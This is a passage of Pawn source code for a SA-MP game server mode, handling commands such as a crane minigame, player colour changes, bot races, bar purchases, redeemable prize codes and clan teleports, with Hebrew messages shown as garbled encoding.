				format(string,sizeof(string)," .îùúîù ëòú áîðåó, åðåúøå ìå %d ùðéåú (ID: %03d) %s",playerinfo[usingID][cranetime],usingID,GetName(usingID));
			}
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"enter"))
		{
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .àúä ëáø áîðåó");
			new usingID = INVALID_PLAYER_ID;
			for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][incrane])
			{
				usingID = i;
				break;
			}
			if(usingID != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .äîðåó úôåñ");
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0) return SendClientMessage(playerid,red," .øëá æä ìà éëåì ìòìåú òì äîðåó");
			SetVehicleHealth(GetPlayerVehicleID(playerid),10000.0);
			SetVehiclePos(GetPlayerVehicleID(playerid),680.1769,945.6432,-5.8226);
			playerinfo[playerid][incrane] = 1, playerinfo[playerid][cranetime] = 90;
			SendClientMessage(playerid,lightblue," ~~~ !áøåëéí äáàéí ìîðåó ~~~");
			SendClientMessage(playerid,green," .éù ìê 90 ùðéåú ìäðåú îîðå, ëùééâîø äæîï äîå÷öá úöà îäîðåó");
			SendClientMessage(playerid,orange,"  /crane exit àí áøöåðê ìöàú ìôðé äùúîù áô÷åãä");
			SendClientMessage(playerid,orange,"  /crane boom øåöä ÷öú ôòìåìéí? äùúîù áô÷åãä");
		}
		else if(equal(cmd,"exit"))
		{
			if(!playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .àéðê áîðåó");
			SetVehicleHealth(GetPlayerVehicleID(playerid),0.0);
			SetPlayerHealth(playerid,0.0);
			SpawnPlayer(playerid);
			playerinfo[playerid][incrane] = 0, playerinfo[playerid][cranetime] = 0;
			SendClientMessage(playerid,red," .éöàú îäîðåó");
			News(" !äîðåó ôðåé");
		}
		else if(equal(cmd,"boom"))
		{
			new Float:p[3], Float:h;
			GetVehicleHealth(GetPlayerVehicleID(playerid),p[0]);
			if(!playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .àéðê áîðåó");
			GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
			CreateExplosion(p[0],p[1],p[2],7,1.0);
			GetVehicleHealth(GetPlayerVehicleID(playerid),h);
			for(new i = 0; i < 5; i++) if(h == 10000.0)
			{
				CreateExplosion(p[0],p[1],p[2],7,1.0);
				GetVehicleHealth(GetPlayerVehicleID(playerid),h);
			}
			else break;
			SetVehicleHealth(GetPlayerVehicleID(playerid),10000.0);
		}
		else return SendClientMessage(playerid,red," .àôùøåú îðåó ùâåéä");
		return 1;
	}
	if(equal(cmd,"/testrgb"))
	{
		new r = 0, g = 0, b = 0, string[M_S], colID = -1, colN[32];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testrgb <red> [green] [blue] :òìéê ìä÷ìéã öáò àãåí");
		r = strval(cmd), cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testrgb [red] <green> [blue] :òìéê ìä÷ìéã öáò éøå÷");
		g = strval(cmd), cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testrgb [red] [green] <blue> :òìéê ìä÷ìéã öáò ëçåì");
		b = strval(cmd);
		if(r < 0 || r > 255) return SendClientMessage(playerid,red," .öáò àãåí ùâåé");
		if(g < 0 || g > 255) return SendClientMessage(playerid,red," .öáò éøå÷ ùâåé");
		if(b < 0 || b > 255) return SendClientMessage(playerid,red," .öáò ëçåì ùâåé");
		new theColor = rgba2hex(r,g,b,255);
		format(string,sizeof(string)," .äöáò %d, %d, %d äåà öáò ääåãòä äæàú",r,g,b);
		SendClientMessage(playerid,theColor,string);
		for(new i = 0; i < sizeof(Colors); i++) if(theColor == Colors[i][colHex]) colID = i;
		if(colID == -1) colN = "None";
		else format(colN,sizeof(colN),Colors[colID][colName]);
		format(string,sizeof(string)," (RGB: %d, %d, %d | Hex: <á÷øåá> | ColorName: %s)",r,g,b,colN);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/testcolor"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /testcolor [color name] :öåøú äùéîåù");
			return SendClientMessage(playerid,white," /colors :ìøùéîú ùîåú äöáòéí");
		}
		new string[M_S], colID = -1;
		for(new i = 0; i < sizeof(Colors); i++) if(equal(cmd,Colors[i][colName])) colID = i;
		if(colID == -1) return SendClientMessage(playerid,red," .ùí öáò ùâåé");
		new theColor = Colors[colID][colHex];
		format(string,sizeof(string)," .äåà öáò ääåãòä äæàú \"%s\" äöáò",Colors[colID][colName]);
		SendClientMessage(playerid,theColor,string);
		format(string,sizeof(string)," (RGB: %d, %d, %d | Hex: <á÷øåá> | ColorName: %s)",getRed(theColor),getGreen(theColor),getBlue(theColor),Colors[colID][colName]);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/randomcol"))
	{
		new rgb[3];
		for(new i = 0; i < 3; i++) rgb[i] = randomEx(5,250);
		SetPlayerColor(playerid,rgba2hex(rgb[0],rgb[1],rgb[2],255));
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,rgba2hex(rgb[0],rgb[1],rgb[2],153));
		SendClientMessage(playerid,rgba2hex(rgb[0],rgb[1],rgb[2],255)," .äöáò ùìê äùúðä ìöáò øðãåîàìé - öáò ääåãòä äæå");
		return 1;
	}
	if(equal(cmd,"/normalcol"))
	{
		SetPlayerColor(playerid,GetColor(playerid,153));
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
		SendClientMessage(playerid,GetColor(playerid,255)," .äöáò ùìê äùúðä ìöáò ääúçìúé ùìê - öáò ääåãòä äæå");
		return 1;
	}
	if(equal(cmd,"/changecolor"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /changecolor [color name] :öåøú ùéîåù #1");
			return SendClientMessage(playerid,white," /changecolor [red] [green] [blue] :öåøú ùéîåù #2");
		}
		new cmdType = 0, colID = -1, rgb[3] = {-1,-1,-1}, theColor = -1, string[M_S];
		for(new i = 0; i < sizeof(Colors); i++) if(equal(cmd,Colors[i][colName])) colID = i;
		for(new i = 0; i < 3; i++)
		{
			if(i > 0) cmd = strtok(cmdtext,idx);
			rgb[i] = strval(cmd);
		}
		if(colID != -1) cmdType = 1;
		else if(rgb[0] != -1 && rgb[1] != -1 && rgb[2] != -1) cmdType = 2;
		//else if(IsHex(cmd)) cmdType = 3;
		if(!cmdType) return SendClientMessage(playerid,red," .öåøú ùéîåù ùâåéä");
		switch(cmdType)
		{
			case 1:
			{
				theColor = Colors[colID][colHex];
				format(string,sizeof(string)," .öáò ääåãòä äæå - \"%s\" äöáò ùìê äùúðä ìöáò",Colors[colID][colName]);
			}
			case 2:
			{
				if(rgb[0] < 0 || rgb[0] > 255 || rgb[1] < 0 || rgb[1] > 255 || rgb[2] < 0 || rgb[2] > 255) return SendClientMessage(playerid,red," .öáò ùâåé");
				if(IsWBColor(rgb[0],rgb[1],rgb[2])) return SendClientMessage(playerid,red," .äöáò äæä ãåîä îãé ìöáò ìáï / ùçåø");
				theColor = rgba2hex(rgb[0],rgb[1],rgb[2],255);
				format(string,sizeof(string)," .äöáò ùìê äùúðä ìöáò %d, %d, %d - öáò ääåãòä äæå",rgb[0],rgb[1],rgb[2]);
			}
		}
		SetPlayerColor(playerid,setAlpha(theColor,255));
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,setAlpha(theColor,153));
		SendClientMessage(playerid,theColor,string);
		return 1;
	}
	if(equal(cmd,"/colors"))
	{
		new theSize = sizeof(Colors);
		if(!theSize) return SendClientMessage(playerid,red," .ìà ÷ééîéí öáòéí");
		new menus = theSize / 9, string[M_S], m;
		if(!menus || menus)
		{
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú ùîåú öáòéí ~~~");
			for(new i = 0; i < theSize; i++)
			{
				format(string,sizeof(string),"  #%02d) %s (RGB: %d, %d, %d | Hex: <á÷øåá>)",i + 1,Colors[i][colName],getRed(Colors[i][colName]),getGreen(Colors[i][colName]),getBlue(Colors[i][colName]));
				SendClientMessage(playerid,Colors[i][colHex],string);
			}
		}
		else
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd))
			{
				format(string,sizeof(string)," /colors [1-%d] :öåøú äùéîåù",menus);
				return SendClientMessage(playerid,white,string);
			}
			m = strval(cmd);
			if(m < 1 || m > menus) return SendClientMessage(playerid,red," .îñôø úôøéè ùâåé");
			format(string,sizeof(string)," ~~~ :øùéîú ùîåú äöáòéí - %d ~~~",m);
			SendClientMessage(playerid,lightblue,string);
			for(new i = (m - 1) * 9; i < m * 9 && i < theSize; i++)
			{
				format(string,sizeof(string),"  #%02d) %s (RGB: %d, %d, %d | Hex: <á÷øåá>)",i + 1,Colors[i][colName],getRed(Colors[i][colName]),getGreen(Colors[i][colName]),getBlue(Colors[i][colName]));
				SendClientMessage(playerid,Colors[i][colHex],string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/clists"))
	{
		new string[M_S], listID = -1, theColor = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /clists [list name] :öåøú äùéîåù");
			SendClientMessage(playerid,lightblue," ~~~ :øùéîåú ÷ééîåú ~~~");
			new cur = 0;
			for(new i = 0; i < sizeof(ColorLists); i++)
			{
				format(string,sizeof(string),!cur ? (" %s%s") : ("%s  %s"),string,ColorLists[i][ColorListName]);
				cur++;
				if(cur >= 4)
				{
					SendClientMessage(playerid,grey,string);
					string = "", cur = 0;
				}
				else if(i == sizeof(ColorLists) - 1) SendClientMessage(playerid,grey,string);
			}
			return 1;
		}
		for(new i = 0; i < sizeof(ColorLists); i++) if(equal(cmd,ColorLists[i][ColorListName])) listID = i;
		if(listID == -1) return SendClientMessage(playerid,red," .ùí øùéîä ùâåé");
		format(string,sizeof(string)," ~~~ :\"%s\" øùéîú öáòéí áúåê äøùéîä ~~~",ColorLists[listID][ColorListName]);
		SendClientMessage(playerid,lightblue,string);
		for(new i = 0; i < 9; i++)
		{
			theColor = ColorLists[listID][colorsHex][i];
			if(theColor == -1) continue;
			format(string,sizeof(string),"  [%s] #%02d) (RGB: %d, %d, %d | Hex: <á÷øåá>)",ColorLists[listID][ColorListName],i + 1,getRed(theColor),getGreen(theColor),getBlue(theColor));
			SendClientMessage(playerid,theColor,string);
		}
		return 1;
	}
	if(equal(cmd,"/startreplytest") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú îùðéú ôåòìú");
		Replytest();
		return 1;
	}
	if(equal(cmd,"/npclist"))
	{
		new string[M_S], npcs = 0;
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerNPC(i)) npcs++;
		if(!npcs) return SendClientMessage(playerid,red," .àéï ëòú áåèéí áùøú");
		format(string,sizeof(string)," ~~~ :áåèéí áùøú - %d ~~~",npcs);
		SendClientMessage(playerid,lightblue,string);
		npcs = 0;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && IsPlayerNPC(i))
			{
				npcs++;
				format(string,sizeof(string)," %d. %s [ID: %03d | In Vehicle: %s]",npcs,GetName(i),i,IsPlayerInAnyVehicle(i) ? ("Yes") : ("No"));
				SendClientMessage(playerid,green,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/npcrace"))
	{
	    if(!equal(GetName(playerid),"(gmR)Amit") && !equal(GetName(playerid),"[gmR]Amit")) return SendClientMessage(playerid,red," .àôùøåú æå áåèìä ìæîï ÷öø, åúçæåø á÷øåá");
		new string[M_S], npcname[MAX_PLAYER_NAME], nid = 0, w;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
		    SendClientMessage(playerid,lightblue," ~~~ :îéøåöéí òí áåèéí ~~~");
		    SendClientMessage(playerid,yellow,"  .àðå îàôùøéí ìéöåø îéøåöéí òí áåèéí àåèåîèééí òì îðú ìùôø àú éëåìåú äðäéâä ùìëí");
		    SendClientMessage(playerid,yellow,"  :ìäúçìú îéøåõ");
		    SendClientMessage(playerid,white," /npcrace 1 - ðñéòä àéèéú ,Bullet øîä 1: ðäâ");
		    SendClientMessage(playerid,white," /npcrace 2 - ðñéòä îäéøä ,Turismo øîä 2: ðäâ");
		    return SendClientMessage(playerid,white," /npcrace 3 - ðñéòä îäéøä + ðéñéåðåú äúðâùåú ,Infernus øîä 3: ðäâ");
		}
		nid = strval(cmd);
		if(nid < 1 || nid > 3) return SendClientMessage(playerid,red," .øîä ùâåéä");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá ì÷éåí îéøåõ");
		format(npcname,sizeof(npcname),"RaceBot_%d",nid);
		if(IsPlayerConnected(ReturnUser(npcname))) return SendClientMessage(playerid,red," .îùúîù ëìùäå ëáø ðîöà áîéøåõ áøîä äæå. àðà äîúï ùéñééí");
		format(string,sizeof(string)," !äúçéì îéøåõ òí áåè áøîä %d %s",nid,GetName(playerid));
		SendClientMessageToAll(purple,string);
		SendClientMessage(playerid,green,"  !äîéøåõ ùìê éçì áòåã 5 ùðéåú, äúëåðï");
		SendClientMessage(playerid,green,"  æîï îå÷öá ìîéøåõ: 180 ùðéåú");
		SendClientMessage(playerid,red,"  ùéí ìá - áîéøåõ æä àéï ùåí ö'÷ôåéðèéí (îòâìéí àãåîéí). äîéøåõ ôåòì áöåøä ôùåèä ëê ùúåëì ìòùåú áå îä ùúøöä");
		SendClientMessage(playerid,red,"  .ììà ëì çå÷éí, ììà îðöç åììà ôøñ");
		SetPlayerInterior(playerid,0);
		LinkVehicleToInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,w = GetEmptyWorld());
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),w);
		SetTimerEx("StartNPCRace",5000,0,"ii",playerid,nid);
		return 1;
	}
	if(equal(cmd,"/blist"))
	{
	    SendClientMessage(playerid,lightblue," ~~~ :øùéîú îåöøé äáø ~~~");
	    new string[M_S];
	    for(new i = 0; i < sizeof(BarItems); i++)
	    {
	        format(string,sizeof(string),"  %d. %s - %d$",i + 1,BarItems[i][barName],BarItems[i][barCash]);
	        SendClientMessage(playerid,yellow,string);
	    }
	    return 1;
	}
	if(equal(cmd,"/bbuy"))
	{
		new string[M_S], id = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bbuy [bar item number] :öåøú äùéîåù");
		id = strval(cmd);
		if(id < 1 || id > sizeof(BarItems)) return SendClientMessage(playerid,red," .îñôø îåöø ùâåé");
		if(GetMoney(playerid) < BarItems[id - 1][barCash]) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		GiveMoney(playerid,0-BarItems[id - 1][barCash]);
		SetPlayerSpecialAction(playerid,BarItems[id - 1][barSA]);
		format(string,sizeof(string)," .%s ÷ðéú îäáø àú äîåöø",BarItems[id - 1][barName]);
		SendClientMessage(playerid,green,string);
	    return 1;
	}
	if(equal(cmd,"/code"))
	{
		new string[M_S], correctCode = -1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /code [code text] :öåøú äùéîåù");
		fileCheck(file_codes);
		for(new i = 1; i <= 20; i++)
		{
		    format(string,sizeof(string),"%dCodeText",i);
		    if(fkeyexist(file_codes,string) && !equal(fgetstring(file_codes,string),"None") && equal(fgetstring(file_codes,string),cmd))
			{
				correctCode = i;
				break;
			}
		}
		if(correctCode == -1) return SendClientMessage(playerid,red," .ä÷åã ùä÷ìãú ìà ÷ééí áîòøëú / ùåîù ëáø òì éãé îùúîù àçø");
		fsetstring(file_codes,string,"None");
		format(string,sizeof(string),"%dPrizeAmount",correctCode);
		new amount = fgetint(file_codes,string);
		format(string,sizeof(string),"%dCodePrize",correctCode);
		new prize = fgetint(file_codes,string);
	    switch(prize)
	    {
	        case 1: /* Money */ GiveMoney(playerid,amount);
	        case 2: /* Bank Money */
			{
			    if(playerinfo[playerid][bacc])
				{
					playerinfo[playerid][bank] += amount;
					if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
				}
			    else GiveMoney(playerid,amount);
			}
	        case 3: /* Kills */
	        {
				playerinfo[playerid][kills] += amount;
				if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Kills",playerinfo[playerid][kills]);
	        }
	        case 4: /* Weapon Ammo */
	        {
				new id = randomEx(0,8), trys = 0;
				while(!playerinfo[playerid][ammo][id] && trys < 10) id = randomEx(0,8), trys++;
				if(!playerinfo[playerid][ammo][id])
				{
				    SendClientMessage(playerid,red," .ìà äéä ðéúï ìäáéà ìê ëãåøéí ìðù÷ úîéãé ëôé ùàîåø äéä ä÷åã ìäòðé÷. ëôéöåé, ÷éáìú ðù÷éí æîðééí");
				    GiveWeapon(playerid,24,100000);
				    GiveWeapon(playerid,26,100000);
				    GiveWeapon(playerid,28,100000);
				    GiveWeapon(playerid,31,100000);
				    GiveWeapon(playerid,34,100000);
				    GiveWeapon(playerid,35,100000);
				}
				else playerinfo[playerid][ammo][id] += 2;
	        }
	        case 5: /* SuperBonus */
	        {
				new id = randomEx(1,7);
				SetTimerEx("DeleteSuperbonus",id == 5 ? 90000 : 60000,0,"i",playerid);
				playerinfo[playerid][sb] = id;
				format(string,sizeof(string)," :÷éáìú àú ñåôø áåðåñ îñôø %d",id);
				SendClientMessage(playerid,green,string);
				SendClientMessage(playerid,green,SuperBonuses[id][sbName]);
	        }
	        case 6..11: /* Prizes */ CallRemoteFunction("SetPlayerPrize","ii",playerid,prize-5);
	    }
	    if(amount > 0) format(string,sizeof(string)," » [ëîåú: %d] !\"%s\" äùúîù á÷åã ùäðäìú äùøú ôøñîä, åæä áôøñ %s «",amount,CodePrizes[prize],GetName(playerid));
	    else format(string,sizeof(string)," » !\"%s\" äùúîù á÷åã ùäðäìú äùøú ôøñîä, åæä áôøñ %s «",CodePrizes[prize],GetName(playerid));
	    SendClientMessageToAll(green,string);
	    return 1;
	}
	if(equal(cmd,"/addcodes") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) && !playerinfo[playerid][codesmanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new string[M_S], code[32];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /addcodes [number of codes 1 - 20] :öåøú äùéîåù");
		fileCheck(file_codes);
		new n = strval(cmd), rnd, chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", p = 0, a = 0;
		if(n < 1 || n > 20) return SendClientMessage(playerid,red," .òì îñôø ìäéåú áéï 1 ì 20");
		cmd = strtok(cmdtext,idx);
		SendClientMessage(playerid,lightblue," ~~~ :ðåñôå ä÷åãéí äáàéí ~~~");
		for(new i = 1; i <= n; i++)
		{
		    rnd = randomEx(5,8);
		    for(new t = 0; t < rnd; t++) format(code,sizeof(code),"%s%c",code,chars[random(sizeof(chars))]);
		    format(string,sizeof(string),"%dCodeText",i);
		    fsetstring(file_codes,string,code);
		    p = randomEx(1,sizeof(CodePrizes));
		    format(string,sizeof(string),"%dCodePrize",i);
		    fsetint(file_codes,string,p);
		    switch(p)
		    {
		        case 1, 2: a = floatround(randomEx(10000,500001));
		        case 3: a = randomEx(1,101);
		        default: a = 0;
		    }
		    format(string,sizeof(string),"%dPrizeAmount",i);
		    fsetint(file_codes,string,a);
		    format(string,sizeof(string)," Code #%d: %s (%d %s [%d])",i,code,a,CodePrizes[p],p);
		    SendClientMessage(playerid,grey,string);
		    code = "";
		}
	    return 1;
	}
	if(playerinfo[playerid][clan] > 0)
	{
		new clanCMD[M_S];
		format(clanCMD,sizeof(clanCMD),"/%s",claninfo[playerinfo[playerid][clan]][ccmd]);
		if(equal(cmd,clanCMD))
		{
			new Float:h, string[M_S];
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
			GetPlayerHealth(playerid,h);
			if(h < levels[playerinfo[playerid][level]][TeleHealth])
			{
				format(string,sizeof(string)," .áøîúê äðåëçéú, àéðê éëåì ìäùúâø òí ôçåú î %.1f àçåæ çééí",levels[playerinfo[playerid][level]][TeleHealth]);
				SendClientMessage(playerid,red,string);
				return 1;
			}
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
				{
					SetPlayerPos(playerid,claninfo[playerinfo[playerid][clan]][chq][0]+floatrand(-1.0,1.0),claninfo[playerinfo[playerid][clan]][chq][1]+floatrand(-1.0,1.0),claninfo[playerinfo[playerid][clan]][chq][2]);
					SetPlayerFacingAngle(playerid,claninfo[playerinfo[playerid][clan]][chq][3]);
				}
				case PLAYER_STATE_DRIVER:
				{
					SetVehiclePos(GetPlayerVehicleID(playerid),claninfo[playerinfo[playerid][clan]][chqv][0]+floatrand(-3.0,3.0),claninfo[playerinfo[playerid][clan]][chqv][1]+floatrand(-3.0,3.0),claninfo[playerinfo[playerid][clan]][chqv][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),claninfo[playerinfo[playerid][clan]][chqv][3]);
					LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
					SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
				}
			}
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			format(string,sizeof(string),"~y~]~h~%s ~n~~h~headquarter~y~]",claninfo[playerinfo[playerid][clan]][cname]);
			GameTextForPlayer(playerid,string,1500,4);
			format(string,sizeof(string)," !%s áøåëéí äáàéí ìîô÷ãú",claninfo[playerinfo[playerid][clan]][cname]);
			SendClientMessage(playerid,yellow,string);
			return 1;
		}
		else return 0;
	}
	return 0;
}
//=[OnPlayerEnterVehicle]=======================================================
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(debugstate) printf("OnPlayerEnterVehicle(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,ispassenger);
	dbg(10,"1");
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerInVehicle(i,vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER && !playerinfo[playerid][carjack][i])
		{
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			SetPlayerPos(playerid,p[0],p[1],p[2]);
		}
	}
	if(playerinfo[playerid][boomcar]) SetVehicleHealth(vehicleid,100.0);
	dbg(10,"2");
	if(debugstate) printf("OnPlayerEnterVehicle(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,ispassenger);
	return 1;
}
//=[OnPlayerExitVehicle]========================================================
public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(debugstate) printf("OnPlayerExitVehicle(%s(%d),%s(%d)) start",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid);
	if(playerinfo[playerid][gm]) SetVehicleHealth(vehicleid,1000.0);
	if(vehicleinfo[vehicleid][locked] && playerid == vehicleinfo[vehicleid][lastdriver])
	{
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(vehicleid,i,0,0);
		vehicleinfo[vehicleid][locked] = 0, vehicleinfo[vehicleid][lastdriver] = INVALID_PLAYER_ID;
	}
	new string[M_S];
	if(playerinfo[playerid][dinvited] != -1 && playerinfo[playerid][dinviter] && !playerinfo[playerid][indrift])
	{
		SendClientMessage(playerid,green," .éöàú îäøëá åìëï ääæîðä ìãøéôè áåèìä");
		format(string,sizeof(string)," .ééöà îøëáå åìëï ääæîðä ìãøéôè áåèìä %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][dinvited],green,string);
		playerinfo[playerinfo[playerid][dinvited]][bet] = 0, playerinfo[playerinfo[playerid][dinvited]][dplace] = 0, playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1, playerinfo[playerid][dinvited] = -1, playerinfo[playerid][dinviter] = 0, playerinfo[playerid][dplace] = 0;
		return 1;
	}
	if(playerinfo[playerid][indrift])
	{
		format(string,sizeof(string)," .ééöà îäøëá ùìåðöçåï èëðé ìê %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][dinvited],green,string);
		GiveMoney(playerinfo[playerid][dinvited],playerinfo[playerinfo[playerid][dinvited]][bet]);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][dinvited]));
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world_normal);
		DisablePlayerRaceCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerinfo[playerid][dinvited]);
		playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
		playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
		playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dplace] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
		playerinfo[playerid][driftcp] = 0,
		playerinfo[playerid][indrift] = 0,
		playerinfo[playerid][bet] = 0,
		playerinfo[playerid][dinvited] = -1,
		playerinfo[playerid][dinvited] = -1,
		playerinfo[playerid][dinviter] = 0;
	}
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid)
		{
			TogglePlayerSpectating(i,0);
			SetPlayerInterior(i,GetPlayerInterior(playerid));
			TogglePlayerSpectating(i,1);
			PlayerSpectatePlayer(i,playerid);
		}
	}
	if(playerinfo[playerid][inrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][raceid] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		raceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(raceinfo[1] < 3) EndRace(" çåñø ùç÷ðéí",-1);
	}
	if(playerinfo[playerid][inkart])
	{
		playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		DestroyVehicleEx(playerinfo[playerid][kartv]);
		SpawnPlayer(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][kartdriver] = INVALID_PLAYER_ID;
		kartinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
		if(kartinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkart])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Kart ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][kartv]);
					SpawnPlayer(i);
					GiveMoney(i,40000);
					playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
					kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kartinfo[3]);
					PlayerPlaySound(i,1063,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][inmonster])
	{
		playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[GetPlayerVehicleID(playerid)][monsterdriver] = INVALID_PLAYER_ID;
		DestroyVehicleEx(playerinfo[playerid][monsterv]);
		SpawnPlayer(playerid);
